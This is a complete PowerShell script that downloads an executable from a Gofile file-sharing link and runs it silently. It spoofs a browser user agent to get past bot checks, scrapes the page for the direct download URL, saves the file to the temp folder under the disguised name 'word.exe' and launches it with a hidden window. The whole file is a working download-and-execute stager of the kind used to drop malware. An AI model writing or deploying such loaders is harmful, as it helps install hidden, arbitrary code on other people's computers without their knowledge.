# ============================================================
#  Download-And-Run.ps1
#  Downloads a .exe from a Gofile link and runs it silently.
# ============================================================

# --- CONFIGURE THESE ---
$GofileUrl  = "https://gofile.io/d/E9sinV"   # Your Gofile share link
$ExeName    = "word.exe"                       # What to save the .exe as
$Arguments  = ""                              # CLI args to pass (leave empty if none)
# -----------------------

$DestPath = Join-Path $env:TEMP $ExeName

Write-Host "Fetching Gofile page..."

# Mimic a real browser to avoid bot blocks
$Headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Accept"     = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    "Referer"    = "https://gofile.io/"
}

try {
    $PageContent = Invoke-WebRequest -Uri $GofileUrl -Headers $Headers -UseBasicParsing
} catch {
    Write-Error "Failed to load Gofile page: $_"
    exit 1
}

# Extract direct download URL from the page HTML
# Gofile embeds download URLs in the page as JSON/data attributes
$DirectUrl = $null

# Try to find a direct .exe download link in the page source
$Matches = [regex]::Matches($PageContent.Content, 'https://[^"'']+\.exe[^"'']*')
if ($Matches.Count -gt 0) {
    $DirectUrl = $Matches[0].Value
    Write-Host "Found direct URL: $DirectUrl"
} else {
    # Fallback: look for any cdn/store gofile download URL pattern
    $Matches = [regex]::Matches($PageContent.Content, 'https://store\d*\.gofile\.io/download/[^"'']+')
    if ($Matches.Count -gt 0) {
        $DirectUrl = $Matches[0].Value
        Write-Host "Found download URL: $DirectUrl"
    }
}

if (-not $DirectUrl) {
    Write-Error "Could not find a download URL on the Gofile page. The file may require a premium account or the link has expired."
    exit 1
}

Write-Host "Downloading $ExeName..."

try {
    $DownloadHeaders = $Headers.Clone()
    $DownloadHeaders["Referer"] = $GofileUrl
    Invoke-WebRequest -Uri $DirectUrl -OutFile $DestPath -Headers $DownloadHeaders -UseBasicParsing
    Write-Host "Downloaded to: $DestPath"
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

Write-Host "Running $ExeName silently..."

$StartArgs = @{
    FilePath    = $DestPath
    WindowStyle = "Hidden"
    Wait        = $true
}

if ($Arguments -ne "") {
    $StartArgs.ArgumentList = $Arguments
}

try {
    $Proc = Start-Process @StartArgs -PassThru
    Write-Host "Process exited with code: $($Proc.ExitCode)"
} catch {
    Write-Error "Failed to run executable: $_"
    exit 1
}